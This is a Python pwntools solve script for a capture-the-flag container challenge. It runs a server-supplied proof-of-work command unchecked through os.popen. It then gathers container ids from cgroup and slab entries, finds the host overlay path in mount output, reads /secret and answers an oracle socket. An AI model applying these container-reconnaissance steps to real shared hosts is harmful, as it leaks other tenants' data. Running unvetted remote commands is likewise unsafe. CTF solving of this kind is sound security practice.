from pwn import *
import os
import time

r = remote("docker-ams32.nc.jctf.pro", 1337)
cpu = "Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz"

print(r.recvuntil("Proof of Work:"))
r.recvline()
line = r.recvline().decode('utf-8').strip()
print(line)
pow = os.popen(line).readline()
print(r.recv().decode('utf-8'))
print(f"POW: {pow}")
r.sendline(pow)
print(r.recv().decode('utf-8'))

log.info("Getting container id...")
time.sleep(0.1)
print(r.recv().decode('utf-8'))
r.sendline("cat /proc/self/cgroup")
containerid = r.recvuntil(b'0::/system.slice/containerd.service\r\n').decode('utf-8').split("/docker/")[1].split("\n")[0].strip()
print(f"Container id: {containerid}")

# for some reason /sys/kernel/slab/:A-0000208/cgroup contains other container ids
# idk bro
# i legit just did find . "cgroup"
# just guess what docker container contains the oracle
# probably the oldest one
time.sleep(0.1)
log.info("Getting oracle container id...")
time.sleep(0.1)
print(r.recv().decode('utf-8'))
r.sendline("ls /sys/kernel/slab/:A-0000208/cgroup")
# usually our container id is last
things = r.recvuntil(containerid).decode('utf-8').split("\r\n")
for possible in things:
    # docker container ids are 64 bytes
    if len(possible.split(':')[1].split(')')[0]) == 64:
        oraclecontainerid = possible.split(':')[1].split(')')[0]
        break
#containerid2 = r.recvuntil(containerid).decode('utf-8').split("\r\n")[-2].split(':')[1].split(')')[0]
print(f"Oracle container id : {oraclecontainerid}")

time.sleep(0.1)
r.sendline("mount")
#overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/CBXQS5HZOYMLZEIZ452VT2TI5H:/var/lib/docker/overlay2/l/2Z75SSLBOL4CNLSRIRKADNE7XC:/var/lib/docker/overlay2/l/RKOEHILD5AKEFHHIQK7OL3Q5I5:/var/lib/docker/overlay2/l/M22JDOBWCXSKB4IAXT5AWHFOTY:/var/lib/docker/overlay2/l/D2NDK5R3LI6QC43MSIHNLS7NBO,upperdir=/var/lib/docker/overlay2/fc02e2a6f50dffba03c46ef87dd114e31c396a8869008b4c2e9572dd31317809/diff,workdir=/var/lib/docker/overlay2/fc02e2a6f50dffba03c46ef87dd114e31c396a8869008b4c2e9572dd31317809/work,xino=off)
hostdir = r.recvuntil(b'tmpfs on /sys/firmware type tmpfs (ro,relatime)').decode('utf-8').split('upperdir=')[1].split(",")[0] + "/secret"
print(r.recv().decode('utf-8'))
log.info(f"/secret path on host: {hostdir}")

time.sleep(0.1)
r.sendline(f"socat - UNIX-CONNECT:/oracle.sock &")
log.info(f"CPU: {cpu}")
log.info(f"Container id: {containerid}")
r.sendline("fg")
print(r.recv().decode('utf-8'))
r.sendline(cpu)
print(r.recvuntil(b':)').decode('utf-8'))
r.sendline(containerid)
print(r.recvuntil('secret?').decode('utf-8'))
# ctrl+z
log.info("Detaching to read /secret")
r.send(b"\x1a")
r.sendline("bg")
print(r.recvuntil(b'bg').decode('utf-8'))

log.info("Reading secret")
r.sendline("cat /secret")
print(r.recvuntil('/secret\r\n').decode('utf-8'))
secret = r.readline().decode("utf-8").strip()
log.info(f"Secret: {secret}")
print(r.recv().decode('utf-8'))

log.info("Reattaching")
r.sendline("fg")
print(r.recvuntil(b'sock\r\n').decode('utf-8'))
log.info("Sending secret")
r.sendline(secret)
print(r.recvuntil(secret).decode('utf-8'))
print(r.recvline().decode('utf-8'))
log.info("Sending host path")
r.sendline(hostdir)
time.sleep(0.1)
print(r.recvuntil(hostdir).decode('utf-8'))
print(r.recvline())
log.info("Sending second container id")
# oracle container is also a container
r.sendline(oraclecontainerid)
time.sleep(0.1)
print(r.recvuntil(oraclecontainerid))
print(r.recvline())
log.info("Sending oracle container id")
r.sendline(oraclecontainerid)
time.sleep(0.1)
print(r.recvuntil(oraclecontainerid))
print(r.recvline())

r.interactive()